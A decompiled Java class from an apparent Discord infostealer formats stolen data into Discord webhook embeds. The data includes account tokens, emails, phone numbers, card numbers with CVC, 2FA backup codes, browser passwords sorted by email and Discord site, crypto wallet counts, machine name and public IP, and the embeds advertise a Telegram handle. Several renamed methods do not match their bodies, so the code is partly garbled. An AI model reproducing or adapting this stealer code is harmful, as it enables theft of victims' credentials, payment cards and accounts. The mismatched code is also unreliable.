/*\n * ========================================\n * DEOBFUSCATED: EmbedBuilder.java\n * Original: d/l.java\n * ----------------------------------------\n * Discord embed oluşturucu - token, browser data, wallet, CC, 2FA, şifre embedi (853 satır)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package d;

import c.c$EmbedObject;
import c.e$Info;
import c.n$Login;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.invoke.CallSite;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class l {
    private static final int EMBED_COLOR = 0xFF0000;
    private static final String TELEGRAM_URL = "t.me/supremest";
    private static final String DEFAULT_AVATAR = "https://cdn.discordapp.com/embed/avatars/0.png";
    private static String cachedCountry;

    public static c$EmbedObject a(Map<String, Object> map) {
        String string;
        String string2;
        String string3;
        c$EmbedObject c$EmbedObject = new c$EmbedObject();
        String string4 = l.a(map.get("username"), "unknown");
        if (string4.startsWith("@")) {
            string4 = string4.substring(1);
        }
        String string5 = l.a(map.get("id"), "N/A");
        String string6 = l.a(map.get("email"), "N/A");
        if (string6.isEmpty()) {
            string6 = "N/A";
        }
        if ((string3 = l.a(map.get("phone"), "N/A")).isEmpty() || string3.equalsIgnoreCase("None")) {
            string3 = "N/A";
        }
        String string7 = (string2 = l.a(map.get("mfa"), "false")).equalsIgnoreCase("Enabled") || string2.equalsIgnoreCase("true") ? "true" : "false";
        String string8 = l.a(map.get("token"), "");
        String string9 = l.a(map.get("avatar"), c);
        String string10 = l.j(map);
        Map map2 = (Map)map.get("billing");
        String string11 = l.i(map2);
        if (string11 == null || string11.isEmpty() || string11.equalsIgnoreCase("No payment methods")) {
            string11 = "None";
        }
        if ((string = l.a(map.get("location"), "")).isEmpty()) {
            string = l.g();
        }
        int n2 = 1;
        try {
            if (map.get("tokenCount") instanceof Number) {
                n2 = ((Number)map.get("tokenCount")).intValue();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        String string12 = l.c(string5);
        c$EmbedObject.setColor(0xFF0000);
        c$EmbedObject.setAuthor(string4 + " | " + string5, null, string9);
        c$EmbedObject.setThumbnail(string9);
        c$EmbedObject.setTitle(null);
        c$EmbedObject.setDescription("<:tkn:1531019785867890830> **Token**\n```" + string8 + "```");
        c$EmbedObject.addField("<:user:1531019727634300928> Username", "`" + l.a(string4) + "`", true);
        c$EmbedObject.addField("<:badgesss:1531019644784214046> Badges", string10, true);
        c$EmbedObject.addField("<:emaill:1531019669547384892> E-mail", "`" + l.a(string6) + "`", true);
        c$EmbedObject.addField("<:phone1:1531019687318781973> Phone", "`" + l.a(string3) + "`", true);
        c$EmbedObject.addField("<:2fa:1531019708319531179> MFA", "`" + string7 + "`", true);
        c$EmbedObject.addField("<:creditxcard:1531019748093984980> Billing", "`" + l.a(string11) + "`", true);
        c$EmbedObject.addField("<:location1:1531019765747814521> Location", "`" + l.a(string) + "`", true);
        c$EmbedObject.addField("<:tkn:1531019785867890830> All Tokens", "`" + n2 + " tokens found`", true);
        c$EmbedObject.addField("<:calendarsqw:1531019602128146492> Created", "`" + string12 + "`", true);
        String string13 = l.a(map.get("password"), "");
        String string14 = l.a(map.get("newPassword"), "");
        if (!string13.isEmpty()) {
            c$EmbedObject.addField("\ud83d\udd11 Password", "`" + l.a(string13) + "`", true);
        }
        if (!string14.isEmpty() && !string14.equals(string13)) {
            c$EmbedObject.addField("\ud83d\udd11 New Password", "`" + l.a(string14) + "`", true);
        }
        c$EmbedObject.setFooter(l.d(), null);
        return c$EmbedObject;
    }

    public static c$EmbedObject b(Map<String, Object> map) {
        List<c$EmbedObject> list = l.c(map);
        return list.isEmpty() ? null : list.get(0);
    }

    public static List<c$EmbedObject> c(Map<String, Object> map) {
        int n2;
        ArrayList<c$EmbedObject> arrayList = new ArrayList<c$EmbedObject>();
        Map map2 = map == null ? null : (Map)map.get("friends");
        List list = map2 == null ? null : (List)map2.get("hqFriends");
        int n3 = 0;
        if (map2 != null && map2.get("total") instanceof Number) {
            n3 = ((Number)map2.get("total")).intValue();
        }
        int n4 = n2 = list == null ? 0 : list.size();
        if (list == null || list.isEmpty()) {
            c$EmbedObject c$EmbedObject = new c$EmbedObject();
            c$EmbedObject.setColor(0xFF0000);
            c$EmbedObject.setTitle("HQ Friends (0/" + n3 + ")");
            c$EmbedObject.setDescription("```No HQ Friends```");
            c$EmbedObject.setFooter(l.d(), null);
            arrayList.add(c$EmbedObject);
            return arrayList;
        }
        int n5 = 25;
        for (int i2 = 0; i2 < list.size(); i2 += n5) {
            int n6 = Math.min(i2 + n5, list.size());
            List list2 = list.subList(i2, n6);
            c$EmbedObject c$EmbedObject = new c$EmbedObject();
            int n7 = i2 / n5 + 1;
            int n8 = (int)Math.ceil((double)list.size() / (double)n5);
            String string = n8 > 1 ? "HQ Friends (" + n2 + "/" + n3 + ") [" + n7 + "/" + n8 + "]" : "HQ Friends (" + n2 + "/" + n3 + ")";
            c$EmbedObject.setTitle(string);
            c$EmbedObject.setColor(0xFF0000);
            StringBuilder stringBuilder = new StringBuilder();
            for (Object e2 : list2) {
                Map map3 = (Map)e2;
                String string2 = l.a(map3.get("username"), "unknown");
                String string3 = l.a(map3.get("badges"), "").trim();
                if (string3.equals("\u2753")) {
                    string3 = "";
                }
                if (!string3.isEmpty()) {
                    stringBuilder.append(string3).append(" | ");
                }
                stringBuilder.append("`").append(string2).append("`");
                if (Boolean.TRUE.equals(map3.get("shortName"))) {
                    if (string2.length() == 2) {
                        stringBuilder.append(" 2L");
                    } else if (string2.length() == 3) {
                        stringBuilder.append(" 3L");
                    }
                }
                stringBuilder.append("\n");
            }
            c$EmbedObject.setDescription(stringBuilder.toString().trim());
            c$EmbedObject.setFooter(l.d(), null);
            arrayList.add(c$EmbedObject);
        }
        return arrayList;
    }

    public static List<c$EmbedObject> d(Map<String, Object> map) {
        int n2;
        ArrayList<c$EmbedObject> arrayList = new ArrayList<c$EmbedObject>();
        Map map2 = map == null ? null : (Map)map.get("guilds");
        List list = map2 == null ? null : (List)map2.get("adminGuilds");
        int n3 = n2 = list == null ? 0 : list.size();
        if (list == null || list.isEmpty()) {
            c$EmbedObject c$EmbedObject = new c$EmbedObject();
            c$EmbedObject.setColor(0xFF0000);
            c$EmbedObject.setTitle("HQ Servers (0)");
            c$EmbedObject.setDescription("```No HQ Guilds```");
            c$EmbedObject.setFooter(l.d(), null);
            arrayList.add(c$EmbedObject);
            return arrayList;
        }
        int n4 = 20;
        for (int i2 = 0; i2 < list.size(); i2 += n4) {
            int n5 = Math.min(i2 + n4, list.size());
            c$EmbedObject c$EmbedObject = new c$EmbedObject();
            c$EmbedObject.setColor(0xFF0000);
            c$EmbedObject.setTitle("HQ Servers (" + n2 + ")");
            StringBuilder stringBuilder = new StringBuilder();
            for (Object e2 : list.subList(i2, n5)) {
                Map map3 = (Map)e2;
                String string = l.a(map3.get("name"), "unknown");
                int n6 = 0;
                if (map3.get("memberCount") instanceof Number) {
                    n6 = ((Number)map3.get("memberCount")).intValue();
                }
                stringBuilder.append("`").append(l.a(string)).append("`");
                if (n6 > 0) {
                    stringBuilder.append(" | ").append(n6);
                }
                stringBuilder.append("\n");
            }
            c$EmbedObject.setDescription(stringBuilder.toString().trim());
            c$EmbedObject.setFooter(l.d(), null);
            arrayList.add(c$EmbedObject);
        }
        return arrayList;
    }

    public static c$EmbedObject e(Map<String, Object> map) {
        c$EmbedObject c$EmbedObject = l.a(map);
        if (c$EmbedObject != null) {
            c$EmbedObject.setTitle("Login Detected");
        }
        return c$EmbedObject;
    }

    public static c$EmbedObject f(Map<String, Object> map) {
        HashMap<String, Object> hashMap = map == null ? new HashMap<String, Object>() : new HashMap<String, Object>(map);
        return l.a(hashMap);
    }

    public static c$EmbedObject a(Map<String, Object> map, String string) {
        HashMap<String, Object> hashMap;
        HashMap<String, Object> hashMap2 = hashMap = map == null ? new HashMap<String, Object>() : new HashMap<String, Object>(map);
        if (string != null && !string.isEmpty()) {
            hashMap.put("email", string);
        }
        return l.a(hashMap);
    }

    public static c$EmbedObject g(Map<String, Object> map) {
        c$EmbedObject c$EmbedObject = new c$EmbedObject();
        String string = (String)map.get("username");
        String string2 = (String)map.get("token");
        String string3 = (String)map.get("avatar");
        Map map2 = (Map)map.get("creditCard");
        c$EmbedObject.setTitle("Credit Card Added");
        c$EmbedObject.setDescription("**" + string + "** added a credit card!");
        c$EmbedObject.setColor(0xFF0000);
        c$EmbedObject.setThumbnail(string3);
        c$EmbedObject.addField("**Username**", "`" + l.a(string) + "`", true);
        c$EmbedObject.addField("**Card Number**", "`" + l.a((String)map2.get("number")) + "`", true);
        c$EmbedObject.addField("**Expiry**", "`" + l.a((String)map2.get("exp")) + "`", true);
        c$EmbedObject.addField("**CVC**", "`" + l.a((String)map2.get("cvc")) + "`", true);
        c$EmbedObject.addField("**Token**", "```" + string2 + "```", false);
        c$EmbedObject.setFooter(l.d(), null);
        return c$EmbedObject;
    }

    public static c$EmbedObject h(Map<String, Object> map) {
        c$EmbedObject c$EmbedObject = new c$EmbedObject();
        String string = (String)map.get("username");
        String string2 = (String)map.get("email");
        String string3 = (String)map.get("phone");
        String string4 = (String)map.get("token");
        String string5 = (String)map.get("avatar");
        String string6 = (String)map.get("bcPassword");
        List list = (List)map.get("backupCodes");
        String string7 = list != null && !list.isEmpty() ? String.join((CharSequence)"\n", list) : "No codes captured";
        c$EmbedObject.setTitle("2FA Backup Codes Viewed");
        c$EmbedObject.setDescription("**" + string + "** just viewed his 2FA backup codes!");
        c$EmbedObject.setColor(0xFF0000);
        c$EmbedObject.setThumbnail(string5);
        c$EmbedObject.addField("**Backup Codes**", "```" + l.b(string7) + "```", false);
        c$EmbedObject.addField("**Password**", "`" + l.a(string6 != null ? string6 : "Not captured") + "`", true);
        c$EmbedObject.addField("**Mail**", "`" + l.a(string2) + "`", true);
        c$EmbedObject.addField("**Phone**", "`" + l.a(string3) + "`", true);
        c$EmbedObject.addField("**Token**", "```" + string4 + "```", false);
        c$EmbedObject.setFooter(l.d(), null);
        return c$EmbedObject;
    }

    private static String i(Map<String, Object> map) {
        if (map == null) {
            return "No payment methods";
        }
        int n2 = (Integer)map.getOrDefault("cards", 0);
        boolean bl = (Boolean)map.getOrDefault("paypal", false);
        ArrayList<Object> arrayList = new ArrayList<Object>();
        if (n2 > 0) {
            arrayList.add(n2 + " Card" + (n2 > 1 ? "s" : ""));
        }
        if (bl) {
            arrayList.add("PayPal");
        }
        return arrayList.isEmpty() ? "No payment methods" : String.join((CharSequence)", ", arrayList.stream().map(String::valueOf).toList());
    }

    private static String maskEmail(String email) {
        if (string == null) {
            return "";
        }
        return string.replace("\\", "\\\\").replace("`", "\\`").replace("*", "\\*").replace("_", "\\_").replace("~", "\\~").replace("|", "\\|");
    }

    private static String maskPhone(String phone) {
        if (string == null) {
            return "";
        }
        return string.replace("```", "\\`\\`\\`");
    }

    private static String getComputerInfo() {
        return "`" + l.c() + "` - `" + System.getProperty("user.name") + "`";
    }

    private static String getUsername() {
        return System.getProperty("user.name");
    }

    private static String getComputerName() {
        try {
            return InetAddress.getLocalHost().getHostName();
        }
        catch (Exception exception) {
            return "Unknown";
        }
    }

    public static c$EmbedObject a(List<n$Login> list, Set<e$Info> set) {
        return l.a(list, set, null, 0, 0, 0, 0, 0);
    }

    public static c$EmbedObject a(List<n$Login> list, Set<e$Info> set, String string) {
        return l.a(list, set, string, 0, 0, 0, 0, 0);
    }

    public static c$EmbedObject a(List<n$Login> list, Set<e$Info> set, String string, int n2, int n3, int n4, int n5, int n6) {
        if (list == null) {
            list = new ArrayList<n$Login>();
        }
        c$EmbedObject c$EmbedObject = new c$EmbedObject();
        c$EmbedObject.setColor(0xFF0000);
        c$EmbedObject.setTitle("\ud83d\udcc1 Browser Data");
        String string2 = l.b();
        String string3 = l.f().replace('.', '-');
        if (n2 <= 0) {
            n2 = list.size();
        }
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("```\n");
        stringBuilder.append("================================================\n");
        stringBuilder.append("User : ").append(string2).append("\n");
        stringBuilder.append("Machine : ").append(string3).append("\n");
        stringBuilder.append("------------------------------------------------\n");
        stringBuilder.append("Cookies : ").append(n3).append("\n");
        stringBuilder.append("Passwords : ").append(n2).append("\n");
        stringBuilder.append("Cards : ").append(n4).append("\n");
        stringBuilder.append("History : ").append(n6).append("\n");
        stringBuilder.append("AutoFills : ").append(n5).append("\n");
        stringBuilder.append("Downloads : 0\n");
        stringBuilder.append("================================================\n");
        stringBuilder.append("```\n");
        if (string != null && !string.isEmpty()) {
            stringBuilder.append("\n[Download Zip](").append(string).append(")\n");
        }
        stringBuilder.append("\n**Most Used Passwords**\n");
        String string4 = l.a(list, 5);
        stringBuilder.append(string4.isEmpty() ? "\u2796 `-`\n" : string4);
        stringBuilder.append("\n**Email Passwords**\n");
        String string5 = l.b(list, 10);
        stringBuilder.append(string5.isEmpty() ? "\ud83d\udce7 `-`\n" : string5);
        stringBuilder.append("\n**Discord Passwords**\n");
        String string6 = l.c(list, 10);
        stringBuilder.append(string6.isEmpty() ? "\ud83d\udcac `-`\n" : string6);
        Object object = stringBuilder.toString();
        if (((String)object).length() > 4090) {
            object = ((String)object).substring(0, 4087) + "...";
        }
        c$EmbedObject.setDescription((String)object);
        c$EmbedObject.setFooter(l.e(), null);
        return c$EmbedObject;
    }

    public static c$EmbedObject a(List<n$Login> list) {
        Object object;
        if (list == null || list.isEmpty()) {
            return null;
        }
        HashMap<String, Integer> hashMap = new HashMap<String, Integer>();
        for (n$Login object22 : list) {
            try {
                String exception = object22.getPassword();
                if (exception == null || exception.trim().isEmpty()) continue;
                hashMap.put(exception, hashMap.getOrDefault(exception, 0) + 1);
            }
            catch (Exception n2) {}
        }
        if (hashMap.isEmpty()) {
            return null;
        }
        ArrayList arrayList = new ArrayList(hashMap.entrySet());
        arrayList.sort(l::lambda$createMostUsedEmbed$0);
        StringBuilder stringBuilder = new StringBuilder();
        int n2 = 0;
        Object object2 = arrayList.iterator();
        while (object2.hasNext()) {
            object = (Map.Entry)object2.next();
            if (n2 >= 5) break;
            stringBuilder.append(l.d((String)object.getKey())).append(" (x").append(object.getValue()).append(")\n");
            ++n2;
        }
        if (((String)(object2 = stringBuilder.toString().trim())).isEmpty()) {
            return null;
        }
        object = new c$EmbedObject();
        ((c$EmbedObject)object).setTitle("Most Used Passwords");
        ((c$EmbedObject)object).setColor(0xFF0000);
        ((c$EmbedObject)object).setDescription((String)object2);
        ((c$EmbedObject)object).setFooter(l.d(), null);
        return object;
    }

    public static c$EmbedObject b(List<n$Login> list) {
        Object object;
        if (list == null || list.isEmpty()) {
            return null;
        }
        ArrayList<CallSite> arrayList = new ArrayList<CallSite>();
        HashSet<CallSite> hashSet = new HashSet<CallSite>();
        for (n$Login n$Login : list) {
            try {
                String string = n$Login.getUsername();
                object = n$Login.getUrl();
                String string2 = n$Login.getPassword();
                if (string2 == null || string2.trim().isEmpty()) continue;
                if (object == null) {
                    object = "";
                }
                if (string == null) {
                    string = "";
                }
                object = ((String)object).toLowerCase();
                String string3 = string.toLowerCase();
                String string4 = null;
                if (string3.endsWith("@gmail.com") || string3.endsWith("@googlemail.com") || ((String)object).contains("gmail") || ((String)object).contains("google")) {
                    string4 = "<:gomail:1512595865817055404>";
                } else if (string3.endsWith("@outlook.com") || string3.endsWith("@hotmail.com") || string3.endsWith("@live.com") || ((String)object).contains("outlook") || ((String)object).contains("hotmail") || ((String)object).contains("live.com")) {
                    string4 = "<:outlook:1512595828597067948>";
                } else if (string3.endsWith("@yahoo.com") || ((String)object).contains("yahoo")) {
                    string4 = "<:yahoox:1514343033829589072>";
                }
                if (string4 == null) continue;
                String string5 = l.d(string);
                String string6 = l.d(string2);
                String string7 = string4 + " " + string5 + " : " + string6;
                if (hashSet.contains(string + string2)) continue;
                hashSet.add((CallSite)((Object)(string + string2)));
                arrayList.add((CallSite)((Object)string7));
            }
            catch (Exception exception) {}
        }
        if (arrayList.isEmpty()) {
            return null;
        }
        StringBuilder stringBuilder = new StringBuilder();
        for (int i2 = 0; i2 < Math.min(arrayList.size(), 15) && stringBuilder.length() + ((String)arrayList.get(i2)).length() + 1 <= 4000; ++i2) {
            stringBuilder.append((String)arrayList.get(i2)).append("\n");
        }
        String string = stringBuilder.toString().trim();
        if (string.isEmpty()) {
            return null;
        }
        object = new c$EmbedObject();
        ((c$EmbedObject)object).setTitle("Email Passwords");
        ((c$EmbedObject)object).setColor(0xFF0000);
        ((c$EmbedObject)object).setDescription(string);
        ((c$EmbedObject)object).setFooter(l.d(), null);
        return object;
    }

    public static c$EmbedObject c(List<n$Login> list) {
        Object object;
        if (list == null || list.isEmpty()) {
            return null;
        }
        ArrayList<CallSite> arrayList = new ArrayList<CallSite>();
        HashSet<CallSite> hashSet = new HashSet<CallSite>();
        for (n$Login n$Login : list) {
            try {
                String string = n$Login.getUrl();
                object = n$Login.getUsername();
                String string2 = n$Login.getPassword();
                if (string2 == null || string2.trim().isEmpty() || string == null || !(string = string.toLowerCase()).contains("discord.com") && !string.contains("discordapp.com")) continue;
                String string3 = l.d((String)(object != null ? object : ""));
                String string4 = l.d(string2);
                String string5 = "<:discordx:1513264363572822196> " + string3 + " : " + string4;
                String string6 = (String)(object != null ? object : "") + string2;
                if (hashSet.contains(string6)) continue;
                hashSet.add((CallSite)((Object)string6));
                arrayList.add((CallSite)((Object)string5));
            }
            catch (Exception exception) {}
        }
        if (arrayList.isEmpty()) {
            return null;
        }
        StringBuilder stringBuilder = new StringBuilder();
        for (int i2 = 0; i2 < Math.min(arrayList.size(), 15) && stringBuilder.length() + ((String)arrayList.get(i2)).length() + 1 <= 4000; ++i2) {
            stringBuilder.append((String)arrayList.get(i2)).append("\n");
        }
        String string = stringBuilder.toString().trim();
        if (string.isEmpty()) {
            return null;
        }
        object = new c$EmbedObject();
        ((c$EmbedObject)object).setTitle("Discord Passwords");
        ((c$EmbedObject)object).setColor(0xFF0000);
        ((c$EmbedObject)object).setDescription(string);
        ((c$EmbedObject)object).setFooter(l.d(), null);
        return object;
    }

    public static c$EmbedObject a(int n2, int n3, int n4, int n5, int n6, List<String> list) {
        int n7 = n2 + n3 + n4 + n5 + n6;
        if (n7 <= 0) {
            return null;
        }
        c$EmbedObject c$EmbedObject = new c$EmbedObject();
        c$EmbedObject.setTitle("Wallets");
        c$EmbedObject.setColor(0xFF0000);
        c$EmbedObject.addField("Browser", String.valueOf(n2), true);
        c$EmbedObject.addField("Desktop", String.valueOf(n3), true);
        c$EmbedObject.addField("Cold", String.valueOf(n4), true);
        c$EmbedObject.addField("wallet.dat", String.valueOf(n5), true);
        c$EmbedObject.addField("Seed Files", String.valueOf(n6), true);
        c$EmbedObject.addField("Total", String.valueOf(n7), true);
        if (list != null && !list.isEmpty()) {
            String string2;
            StringBuilder stringBuilder = new StringBuilder();
            int n8 = 0;
            for (String string2 : list) {
                if (n8 >= 15) break;
                String string3 = l.d(string2);
                if (stringBuilder.length() + string3.length() + 1 > 900) break;
                stringBuilder.append("\u2022 ").append(string3).append("\n");
                ++n8;
            }
            if (list.size() > n8) {
                stringBuilder.append("+").append(list.size() - n8).append(" more");
            }
            if (!(string2 = stringBuilder.toString().trim()).isEmpty()) {
                c$EmbedObject.addField("Found", string2, false);
            }
        }
        c$EmbedObject.setFooter(l.d(), null);
        return c$EmbedObject;
    }

    @Deprecated
    public static c$EmbedObject b(List<n$Login> list, Set<e$Info> set) {
        return l.a(list, set);
    }

    @Deprecated
    public static List<c$EmbedObject> d(List<n$Login> list) {
        c$EmbedObject c$EmbedObject;
        c$EmbedObject c$EmbedObject2;
        ArrayList<c$EmbedObject> arrayList = new ArrayList<c$EmbedObject>();
        c$EmbedObject c$EmbedObject3 = l.a(list);
        if (c$EmbedObject3 != null) {
            arrayList.add(c$EmbedObject3);
        }
        if ((c$EmbedObject2 = l.b(list)) != null) {
            arrayList.add(c$EmbedObject2);
        }
        if ((c$EmbedObject = l.c(list)) != null) {
            arrayList.add(c$EmbedObject);
        }
        return arrayList;
    }

    private static String safeGetString(Object json, String key) {
        if (object == null) {
            return string;
        }
        String string2 = String.valueOf(object);
        return string2.isEmpty() ? string : string2;
    }

    private static String j(Map<String, Object> map) {
        String string = l.a(map.get("badges"), "");
        String string2 = l.a(map.get("nitro"), "");
        boolean bl = Boolean.TRUE.equals(map.get("questBadge"));
        StringBuilder stringBuilder = new StringBuilder();
        if (!string2.isEmpty()) {
            stringBuilder.append(string2.trim());
        }
        if (!string.isEmpty() && !string.equals("\u2753")) {
            if (stringBuilder.length() > 0) {
                stringBuilder.append(' ');
            }
            stringBuilder.append(string.trim());
        }
        if (bl) {
            if (stringBuilder.length() > 0) {
                stringBuilder.append(' ');
            }
            stringBuilder.append("\ud83c\udfaf");
        }
        return stringBuilder.length() == 0 ? "`None`" : stringBuilder.toString();
    }

    private static String getFooterText() {
        return "t.me/supremest | " + l.f();
    }

    private static String getTimestamp() {
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
        return "t.me/supremest | " + simpleDateFormat.format(new Date());
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String getPublicIp() {
        String[] stringArray;
        if (d != null && !d.isEmpty()) {
            return d;
        }
        String[] stringArray2 = stringArray = new String[]{"https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"};
        int n2 = stringArray2.length;
        int n3 = 0;
        while (true) {
            if (n3 >= n2) {
                d = "0.0.0.0";
                return d;
            }
            String string = stringArray2[n3];
            try {
                HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string).openConnection();
                httpURLConnection.setConnectTimeout(4000);
                httpURLConnection.setReadTimeout(4000);
                httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));){
                    String string2 = bufferedReader.readLine();
                    if (string2 != null && !(string2 = string2.trim()).isEmpty() && string2.length() < 64) {
                        String string3 = d = string2;
                        return string3;
                    }
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
            ++n3;
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static String getCountry() {
        try {
            String string = l.f();
            if (string == null) return "Unknown";
            if (string.equals("0.0.0.0")) {
                return "Unknown";
            }
            HttpURLConnection httpURLConnection = (HttpURLConnection)new URL("http://ip-api.com/json/" + string + "?fields=country").openConnection();
            httpURLConnection.setConnectTimeout(4000);
            httpURLConnection.setReadTimeout(4000);
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));){
                String string2 = bufferedReader.readLine();
                if (string2 == null) return "Unknown";
                if (!string2.contains("\"country\":\"")) return "Unknown";
                int n2 = string2.indexOf("\"country\":\"") + 11;
                int n3 = string2.indexOf(34, n2);
                if (n3 <= n2) return "Unknown";
                String string3 = string2.substring(n2, n3);
                return string3;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return "Unknown";
    }

    private static String getAvatarUrl(String userId) {
        try {
            long l2 = Long.parseLong(string.trim());
            long l3 = (l2 >> 22) + 1420070400000L;
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("M/d/yyyy, h:mm:ss a");
            return simpleDateFormat.format(new Date(l3));
        }
        catch (Exception exception) {
            return "N/A";
        }
    }

    private static String getMostUsedPasswords(List<n$Login> logins, int limit) {
        HashMap<String, Integer> hashMap = new HashMap<String, Integer>();
        for (n$Login object2 : list) {
            try {
                String exception = object2.getPassword();
                if (exception == null || exception.trim().isEmpty()) continue;
                hashMap.put(exception, hashMap.getOrDefault(exception, 0) + 1);
            }
            catch (Exception n3) {}
        }
        if (hashMap.isEmpty()) {
            return "";
        }
        ArrayList arrayList = new ArrayList(hashMap.entrySet());
        arrayList.sort(l::lambda$buildMostUsedLines$0);
        StringBuilder stringBuilder = new StringBuilder();
        int n3 = 0;
        Iterator iterator = arrayList.iterator();
        while (iterator.hasNext()) {
            Map.Entry entry = (Map.Entry)iterator.next();
            if (n3 >= n2) break;
            stringBuilder.append("\u2796 `").append(l.d((String)entry.getKey())).append("` (x").append(entry.getValue()).append(")\n");
            ++n3;
        }
        return stringBuilder.toString();
    }

    private static String getEmailPasswords(List<n$Login> logins, int limit) {
        StringBuilder stringBuilder = new StringBuilder();
        HashSet<CallSite> hashSet = new HashSet<CallSite>();
        int n3 = 0;
        for (n$Login n$Login : list) {
            if (n3 >= n2) break;
            try {
                String string;
                String string2 = n$Login.getUsername();
                String string3 = n$Login.getUrl();
                String string4 = n$Login.getPassword();
                if (string4 == null || string4.trim().isEmpty()) continue;
                if (string3 == null) {
                    string3 = "";
                }
                if (string2 == null) {
                    string2 = "";
                }
                String string5 = string3.toLowerCase();
                String string6 = string2.toLowerCase();
                String string7 = null;
                if (string6.endsWith("@gmail.com") || string6.endsWith("@googlemail.com") || string5.contains("gmail") || string5.contains("google")) {
                    string7 = "\ud83d\udce7";
                } else if (string6.endsWith("@outlook.com") || string6.endsWith("@hotmail.com") || string6.endsWith("@live.com") || string5.contains("outlook") || string5.contains("hotmail")) {
                    string7 = "\ud83d\udce8";
                } else if (string6.endsWith("@yahoo.com") || string5.contains("yahoo")) {
                    string7 = "\ud83d\udce9";
                }
                if (string7 == null || !hashSet.add((CallSite)((Object)(string = string2 + string4)))) continue;
                stringBuilder.append(string7).append(" `").append(l.d(string2)).append(" : ").append(l.d(string4)).append("`\n");
                ++n3;
            }
            catch (Exception exception) {}
        }
        return stringBuilder.toString();
    }

    private static String getDiscordPasswords(List<n$Login> logins, int limit) {
        StringBuilder stringBuilder = new StringBuilder();
        HashSet<CallSite> hashSet = new HashSet<CallSite>();
        int n3 = 0;
        for (n$Login n$Login : list) {
            if (n3 >= n2) break;
            try {
                String string;
                String string2;
                String string3 = n$Login.getUrl();
                String string4 = n$Login.getUsername();
                String string5 = n$Login.getPassword();
                if (string5 == null || string5.trim().isEmpty() || string3 == null || !(string2 = string3.toLowerCase()).contains("discord.com") && !string2.contains("discordapp.com") || !hashSet.add((CallSite)((Object)(string = (string4 == null ? "" : string4) + string5)))) continue;
                stringBuilder.append("\ud83d\udcac `").append(l.d(string4 != null ? string4 : "")).append(" : ").append(l.d(string5)).append("`\n");
                ++n3;
            }
            catch (Exception exception) {}
        }
        return stringBuilder.toString();
    }

    private static String snowflakeToDate(String id) {
        if (string == null) {
            return "";
        }
        StringBuilder stringBuilder = new StringBuilder();
        block8: for (int i2 = 0; i2 < string.length() && stringBuilder.length() < 80; ++i2) {
            char c2 = string.charAt(i2);
            if (c2 < ' ' || c2 == '\u007f') continue;
            switch (c2) {
                case '`': {
                    stringBuilder.append('\'');
                    continue block8;
                }
                case '*': {
                    stringBuilder.append("\\*");
                    continue block8;
                }
                case '_': {
                    stringBuilder.append("\\_");
                    continue block8;
                }
                case '~': {
                    stringBuilder.append("\\~");
                    continue block8;
                }
                case '|': {
                    stringBuilder.append("\\|");
                    continue block8;
                }
                case '\\': {
                    stringBuilder.append("\\\\");
                    continue block8;
                }
                default: {
                    stringBuilder.append(c2);
                }
            }
        }
        String string2 = stringBuilder.toString().trim();
        return string2.isEmpty() ? "N/A" : string2;
    }

    private static String getBrowserEmojiId(e$Info browser) {
        switch (e$Info) {
            case GOOGLE_CHROME: {
                return "<:chrome:1512590728046579751>";
            }
            case OPERA_GX: {
                return "<:operagx:1512590677631045795>";
            }
            case FIREFOX: {
                return "<:firefox:1512591132041674878>";
            }
            case MICROSOFT_EDGE: {
                return "<:edge:1512590754982137866>";
            }
            case OPERA: {
                return "<:opera:1512590704222928966>";
            }
            case BRAVE: {
                return "<:brave:1512590783080042496>";
            }
            case YANDEX: {
                return "<:yandex:1512602260213993725>";
            }
            case VIVALDI: {
                return "<:vivaldi:1512602177267433693>";
            }
        }
        return "<:chrome:1512590728046579751>";
    }

    private static int lambda$buildMostUsedLines$0(Map.Entry entry, Map.Entry entry2) {
        return ((Integer)entry2.getValue()).compareTo((Integer)entry.getValue());
    }

    private static int lambda$createMostUsedEmbed$0(Map.Entry entry, Map.Entry entry2) {
        return ((Integer)entry2.getValue()).compareTo((Integer)entry.getValue());
    }
}

